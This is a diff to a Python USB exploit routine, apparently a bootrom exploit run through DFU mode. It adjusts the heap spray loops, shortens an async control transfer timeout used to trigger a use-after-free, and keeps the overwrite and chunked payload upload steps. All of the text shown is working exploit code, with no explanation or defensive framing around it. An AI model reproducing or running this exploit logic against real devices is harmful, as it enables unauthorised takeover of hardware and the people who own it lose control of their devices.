@@ -482,13 +482,14 @@ def exploit():
   # Stage: SPRAY
   if config.large_leak is not None:
     usb_req_stall(device)
-    for i in range(config.large_leak):
+    for _ in range(config.large_leak):
       usb_req_leak(device)
     usb_req_no_leak(device)
   else:
     stall(device)
-    for i in range(config.hole):
-      no_leak(device)
+    if config.hole:
+      for _ in range(config.hole):
+        no_leak(device)
     usb_req_leak(device)
     no_leak(device)
   dfu.usb_reset(device)
@@ -497,7 +498,7 @@ def exploit():
   device = dfu.acquire_device()
 
   device.serial_number
-  libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, b'A' * 0x800, 10)
+  libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, b'A' * 0x800, 0.0001)
 
   # Advance buffer offset before triggering the UaF to prevent trashing the heap - thanks to Linus Henze
   libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
@@ -510,11 +511,12 @@ def exploit():
   if config.large_leak is not None:
     usb_req_leak(device)
   else:
-    for i in range(config.leak):
-      usb_req_leak(device)
+    if config.leak:
+      for _ in range(config.leak):
+        usb_req_leak(device)
   libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 100)
   for i in range(0, len(payload), 0x800):
-    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 100)
+    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i : i + 0x800], 100)
   dfu.usb_reset(device)
   dfu.release_device(device)
 
